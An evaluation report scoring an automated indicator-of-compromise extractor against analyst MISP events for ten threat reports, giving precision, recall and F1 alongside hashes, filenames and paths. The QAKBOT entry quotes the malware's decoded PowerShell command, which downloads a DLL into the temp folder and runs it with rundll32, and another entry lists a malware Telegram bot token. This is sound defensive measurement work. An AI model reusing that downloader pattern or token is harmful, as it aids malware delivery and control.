# Analyst Comparison Report

## Aggregate

| Metric | Value |
|---|---:|
| Samples | 10 |
| Precision | 96.00% |
| Recall | 93.51% |
| F1 | 94.74% |
| True Positive | 216 |
| False Positive | 9 |
| False Negative | 15 |
| Unsupported analyst items | 50 |

## Per Event

| Event | Scope | Valid IoC | Expected | Precision | Recall | F1 | Unsupported |
|---|---|---:|---:|---:|---:|---:|---:|
| misp.event.1232.json | ioc_section | 16 | 17 | 100.00% | 94.12% | 96.97% | 6 |
| misp.event.1233.json | full_article | 37 | 37 | 100.00% | 100.00% | 100.00% | 0 |
| misp.event.1234.json | ioc_section | 46 | 46 | 100.00% | 100.00% | 100.00% | 26 |
| misp.event.1235.json | ioc_section | 18 | 18 | 100.00% | 100.00% | 100.00% | 0 |
| misp.event.1263.json | ioc_section | 26 | 26 | 100.00% | 100.00% | 100.00% | 1 |
| misp.event.1264.json | ioc_section | 4 | 4 | 100.00% | 100.00% | 100.00% | 0 |
| misp.event.1265.json | ioc_section | 15 | 15 | 100.00% | 100.00% | 100.00% | 10 |
| misp.event.1266.json | ioc_section | 31 | 36 | 70.97% | 61.11% | 65.67% | 6 |
| misp.event.1267.json | ioc_section | 14 | 14 | 100.00% | 100.00% | 100.00% | 0 |
| misp.event.1268.json | ioc_section | 18 | 18 | 100.00% | 100.00% | 100.00% | 1 |

### misp.event.1232.json

- Analyst event: `Axios NPM Package Compromised: Supply Chain Attack Hits JavaScript HTTP Client with 100M+ Weekly Downloads`
- Source: `https://www.trendmicro.com/en_us/research/26/c/axios-npm-package-compromised.html`
- Extraction scope: `ioc_section`
- Runtime: `736.17 ms`
- Predicted by type: `{"url": 1, "ip-dst": 1, "domain": 1, "sha1": 3, "sha256": 7, "custom:npm-package": 3}`
- Expected by type: `{"url": 1, "ip-dst": 1, "domain": 2, "sha1": 3, "sha256": 7, "custom:npm-package": 3}`
- Precision / Recall / F1: `100.00% / 94.12% / 96.97%`
- False negatives: `[{"type": "domain", "value": "packages.npm.org"}]`
- Unsupported analyst items: `[{"type": "filename", "value": "setup.js", "object": "file", "relation": "filename", "comment": ""}, {"type": "filename", "value": "6202033.vbs", "object": "file", "relation": "filename", "comment": ""}, {"type": "filename", "value": "6202033.ps1", "object": "file", "relation": "filename", "comment": ""}, {"type": "filename", "value": "system.bat", "object": "file", "relation": "filename", "comment": ""}, {"type": "filename", "value": "com.apple.act.mond", "object": "file", "relation": "filename", "comment": ""}, {"type": "filename", "value": "ld.py", "object": "file", "relation": "filename", "comment": ""}]`

### misp.event.1233.json

- Analyst event: `github iocs`
- Source: `https://raw.githubusercontent.com/Cisco-Talos/IOCs/refs/heads/main/2026/04/powmix-botnet-targets-czech-workforce.txt`
- Extraction scope: `full_article`
- Runtime: `92.34 ms`
- Predicted by type: `{"url": 4, "sha256": 33}`
- Expected by type: `{"url": 4, "sha256": 33}`
- Precision / Recall / F1: `100.00% / 100.00% / 100.00%`

### misp.event.1234.json

- Analyst event: `Boggy Serpens Threat Assessment`
- Source: `https://unit42.paloaltonetworks.com/boggy-serpens-threat-assessment/`
- Extraction scope: `ioc_section`
- Runtime: `182.63 ms`
- Predicted by type: `{"ip-dst": 5, "domain": 10, "sha256": 31}`
- Expected by type: `{"ip-dst": 5, "domain": 10, "sha256": 31}`
- Precision / Recall / F1: `100.00% / 100.00% / 100.00%`
- Unsupported analyst items: `[{"type": "text", "value": "8398566164:AAEJbk6EOirZ_ybm4PJ-q8mOpr1RkZx1H7Q", "object": "", "relation": "", "comment": "Telegram Bot ID"}, {"type": "filename", "value": "Reddit.exe", "object": "file", "relation": "filename", "comment": "BlackBeard Variant (Reddit.exe)"}, {"type": "filename", "value": "%USERPROFILE%\\Desktop\\phonix\\phoenix\\x64\\Release\\phoenix.pdb", "object": "file", "relation": "filename", "comment": "BlackBeard and generic Phoenix family variants"}, {"type": "filename", "value": "Char.pdb", "object": "file", "relation": "filename", "comment": "LampoRAT"}, {"type": "filename", "value": "%USERPROFILE%\\source\\repos\\http_vip\\http_vip\\f*ckAnalyzor.pdb", "object": "file", "relation": "filename", "comment": "Nuso variant"}, {"type": "filename", "value": "%USERPROFILE%\\source\\repos\\http_last_ver\\http_last_ver\\f*ckAnalyser.pdb", "object": "file", "relation": "filename", "comment": "Nuso variant"}, {"type": "filename", "value": "D:\\phonix\\phoenixV3\\phoenixV3\\phoenixV2\\x64\\Release\\phoenix.pdb", "object": "file", "relation": "filename", "comment": "Phoenix Dropper and Phoenix Malware"}, {"type": "filename", "value": "%USERPROFILE%\\Desktop\\phoenixV4\\phoenixV3\\phoenixV2\\x64\\Release\\phoenix.pdb", "object": "file", "relation": "filename", "comment": "Phoenix v4 variant"}, {"type": "filename", "value": "%USERPROFILE%\\Desktop\\phoenixV4\\phoenixV3\\phoenixV2\\x64\\Debug\\phoenix.pdb", "object": "file", "relation": "filename", "comment": "Phoenix v4/Mononoke backdoor"}, {"type": "filename", "value": "Copy\\x64\\release_86\\udp_3.0.pdb", "object": "file", "relation": "filename", "comment": "UDPGangster"}, {"type": "filename", "value": "sh*t.doc", "object": "file", "relation": "filename", "comment": ""}, {"type": "filename", "value": "Seminar.FM.gov.om.doc", "object": "file", "relation": "filename", "comment": ""}, {"type": "filename", "value": "Seminar.MFA.gov.ct.tr", "object": "file", "relation": "filename", "comment": ""}, {"type": "filename", "value": "2).doc", "object": "file", "relation": "filename", "comment": ""}, {"type": "filename", "value": "#27790.doc", "object": "file", "relation": "filename", "comment": ""}, {"type": "filename", "value": "FreeSpan_16082025.2.doc", "object": "file", "relation": "filename", "comment": ""}, {"type": "filename", "value": "AIC_2025.doc", "object": "file", "relation": "filename", "comment": ""}, {"type": "filename", "value": "Economy.doc", "object": "file", "relation": "filename", "comment": ""}, {"type": "filename", "value": "sondouq.doc", "object": "file", "relation": "filename", "comment": ""}, {"type": "filename", "value": "Webinar.doc", "object": "file", "relation": "filename", "comment": ""}, {"type": "filename", "value": "Webinar.zip", "object": "file", "relation": "filename", "comment": ""}, {"type": "filename", "value": "Scheduled_Internet_Outages.doc", "object": "file", "relation": "filename", "comment": ""}, {"type": "filename", "value": "Cybersecurity.doc", "object": "file", "relation": "filename", "comment": ""}, {"type": "filename", "value": "Sheet_Filled.xls", "object": "file", "relation": "filename", "comment": ""}, {"type": "filename", "value": "Beevi.doc", "object": "file", "relation": "filename", "comment": ""}, {"type": "filename", "value": "2026).xls", "object": "file", "relation": "filename", "comment": ""}]`

### misp.event.1235.json

- Analyst event: `Beyond the breach: inside a cargo theft actorâ€™s post-compromise playbook`
- Source: `https://www.proofpoint.com/us/blog/threat-insight/beyond-breach-inside-cargo-theft-actors-post-compromise-playbook`
- Extraction scope: `ioc_section`
- Runtime: `176.90 ms`
- Predicted by type: `{"url": 2, "ip-dst": 1, "domain": 6, "sha256": 9}`
- Expected by type: `{"url": 2, "ip-dst": 1, "domain": 6, "sha256": 9}`
- Precision / Recall / F1: `100.00% / 100.00% / 100.00%`

### misp.event.1263.json

- Analyst event: `A Deep Dive Into Attempted Exploitation of CVE-2023-33538`
- Source: `https://unit42.paloaltonetworks.com/exploitation-of-cve-2023-33538/`
- Extraction scope: `ioc_section`
- Runtime: `135.12 ms`
- Predicted by type: `{"url": 15, "ip-dst": 1, "domain": 1, "sha256": 9}`
- Expected by type: `{"url": 15, "ip-dst": 1, "domain": 1, "sha256": 9}`
- Precision / Recall / F1: `100.00% / 100.00% / 100.00%`
- Unsupported analyst items: `[{"type": "vulnerability", "value": "CVE-2023-33538", "object": "", "relation": "", "comment": "Exploited vulnerability"}]`

### misp.event.1264.json

- Analyst event: `From Linear to Complex: An Upgrade in RansomHouse Encryption`
- Source: `https://unit42.paloaltonetworks.com/ransomhouse-encryption-upgrade/`
- Extraction scope: `ioc_section`
- Runtime: `129.99 ms`
- Predicted by type: `{"sha256": 4}`
- Expected by type: `{"sha256": 4}`
- Precision / Recall / F1: `100.00% / 100.00% / 100.00%`

### misp.event.1265.json

- Analyst event: `Threat Brief: CVE-2025-0282 and CVE-2025-0283 (Updated March 11)`
- Source: `https://unit42.paloaltonetworks.com/threat-brief-ivanti-cve-2025-0282-cve-2025-0283/`
- Extraction scope: `ioc_section`
- Runtime: `127.33 ms`
- Predicted by type: `{"ip-dst": 4, "domain": 1, "sha256": 10}`
- Expected by type: `{"ip-dst": 4, "domain": 1, "sha256": 10}`
- Precision / Recall / F1: `100.00% / 100.00% / 100.00%`
- Unsupported analyst items: `[{"type": "text", "value": "DESKTOP-1JIMIV3", "object": "", "relation": "", "comment": "Remote computer name seen accessing compromised accounts"}, {"type": "filename", "value": "ldap.pl", "object": "file", "relation": "filename", "comment": ""}, {"type": "filename", "value": "vixDisklib.dll", "object": "file", "relation": "filename", "comment": ""}, {"type": "filename", "value": "package.dll", "object": "file", "relation": "filename", "comment": ""}, {"type": "filename", "value": "error.dat", "object": "file", "relation": "filename", "comment": ""}, {"type": "filename", "value": "msbuild.lnk", "object": "file", "relation": "filename", "comment": ""}, {"type": "filename", "value": "mini.xml", "object": "file", "relation": "filename", "comment": ""}, {"type": "filename", "value": "deelevator64.dll", "object": "file", "relation": "filename", "comment": ""}, {"type": "vulnerability", "value": "CVE-2025-0282", "object": "vulnerability", "relation": "id", "comment": ""}, {"type": "vulnerability", "value": "CVE-2025-0283", "object": "vulnerability", "relation": "id", "comment": ""}]`

### misp.event.1266.json

- Analyst event: `Threat Recap: Darkside, Crysis, Negasteal, Coinminer`
- Source: `https://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/threat-recap-darkside-crysis-negasteal-coinminer`
- Extraction scope: `ioc_section`
- Runtime: `161.21 ms`
- Predicted by type: `{"url": 4, "ip-dst": 1, "domain": 1, "sha256": 25}`
- Expected by type: `{"url": 4, "ip-dst": 1, "domain": 1, "md5": 14, "sha256": 16}`
- Precision / Recall / F1: `70.97% / 61.11% / 65.67%`
- False positives: `[{"type": "sha256", "value": "12434186b803afd5e75b77bf8439d968ef0bb18ed8a871a279b95fe0a6c4e132"}, {"type": "sha256", "value": "2da7be1ed9f13424c7b747caea0030b5b19007597640e9700add15bc8d236a1e"}, {"type": "sha256", "value": "329788672911aaed64ba2add41a09f93b878bf8a3291c1309988acadb3643141"}, {"type": "sha256", "value": "663e4b7c209e864faaf598d791a9a6958c70f75bf974853d59bd15bc2a931163"}, {"type": "sha256", "value": "9dade12201cc88cbd90f2fbaf4d50e512d4a377debad6714f19e10195e3a91be"}, {"type": "sha256", "value": "a24f84fa1302c9f4b68791532d2d7dbb0269e2ac2f245652164934289a1ba37e"}, {"type": "sha256", "value": "a78c0bd4cf9f4e21dea1fa67e92a6498c5df83c3ae57bb1f02d40da44e55cd69"}, {"type": "sha256", "value": "ae54783709a60e685846b3812d4e65b54672c8c40d2e8499fa92255ef89b7375"}, {"type": "sha256", "value": "cd4b97c42b5ce9540f141498e2fdd4d566ea0b835d0c295994bf644744b5d4dd"}]`
- False negatives: `[{"type": "md5", "value": "0269e2ac2f245652164934289a1ba37e"}, {"type": "md5", "value": "12434186b803afd5e75b77bf8439d968"}, {"type": "md5", "value": "2d4a377debad6714f19e10195e3a91be"}, {"type": "md5", "value": "2da7be1ed9f13424c7b747caea0030b5"}, {"type": "md5", "value": "329788672911aaed64ba2add41a09f93"}, {"type": "md5", "value": "66ea0b835d0c295994bf644744b5d4dd"}, {"type": "md5", "value": "9dade12201cc88cbd90f2fbaf4d50e51"}, {"type": "md5", "value": "a24f84fa1302c9f4b68791532d2d7dbb"}, {"type": "md5", "value": "a78c0bd4cf9f4e21dea1fa67e92a6498"}, {"type": "md5", "value": "b19007597640e9700add15bc8d236a1e"}, {"type": "md5", "value": "b878bf8a3291c1309988acadb3643141"}, {"type": "md5", "value": "c5df83c3ae57bb1f02d40da44e55cd69"}, {"type": "md5", "value": "cd4b97c42b5ce9540f141498e2fdd4d5"}, {"type": "md5", "value": "ef0bb18ed8a871a279b95fe0a6c4e132"}]`
- Unsupported analyst items: `[{"type": "filename", "value": "GdAgentSrv.de.dll", "object": "file", "relation": "filename", "comment": ""}, {"type": "filename", "value": "process-hacker-2-39.exe", "object": "file", "relation": "filename", "comment": ""}, {"type": "filename", "value": "takeaway.exe", "object": "file", "relation": "filename", "comment": ""}, {"type": "filename", "value": "winhost.exe", "object": "file", "relation": "filename", "comment": ""}, {"type": "filename", "value": "purgeMemory.ps1", "object": "file", "relation": "filename", "comment": ""}, {"type": "filename", "value": "NS2.ex", "object": "file", "relation": "filename", "comment": ""}]`

### misp.event.1267.json

- Analyst event: `Ransomware Report: Avaddon and New Techniques Emerge, Industrial Sector Targeted`
- Source: `https://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/ransomware-report-avaddon-and-new-techniques-emerge-industrial-sector-targeted`
- Extraction scope: `ioc_section`
- Runtime: `177.98 ms`
- Predicted by type: `{"url": 3, "ip-dst": 1, "sha256": 10}`
- Expected by type: `{"url": 3, "ip-dst": 1, "sha256": 10}`
- Precision / Recall / F1: `100.00% / 100.00% / 100.00%`

### misp.event.1268.json

- Analyst event: `QAKBOT Sneaks in Via HTML Smuggling and HTML Downloader`
- Source: `https://www.trendmicro.com/vinfo/us/threat-encyclopedia/spam/3730/qakbot-sneaks-in-via-html-smuggling-and-html-downloader`
- Extraction scope: `ioc_section`
- Runtime: `139.53 ms`
- Predicted by type: `{"url": 12, "ip-dst": 6}`
- Expected by type: `{"url": 12, "ip-dst": 6}`
- Precision / Recall / F1: `100.00% / 100.00% / 100.00%`
- Unsupported analyst items: `[{"type": "text", "value": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe 'Start-Sleep -Seconds 2;$var1 = ('').split(',');foreach ($var2 in $var1) {try {Invoke-WebRequest $var2 -TimeoutSec 15 -O $env:TEMP\\QAKBOT.dll;if ((Get-Item $env:TEMP\\QAKBOT.dll).length -ge 100000) {start rundll32 $env:TEMP\\\\QAKBOT.dll,GL70;break;}}catch {Start-Sleep -Seconds 2;}}'", "object": "", "relation": "", "comment": "The decoded PowerShell command that the JavaSript file runs"}]`
